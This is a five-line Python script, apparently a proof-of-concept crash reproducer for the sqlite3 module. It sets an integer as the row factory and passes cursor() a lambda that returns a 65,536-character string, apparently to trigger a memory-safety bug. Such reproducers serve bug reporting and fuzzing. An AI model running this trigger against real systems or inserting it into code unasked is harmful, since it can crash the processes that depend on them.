import sqlite3

conn = sqlite3.connect('poc2.db')
conn.row_factory = 12
conn.cursor(lambda x: "A"*0x10000)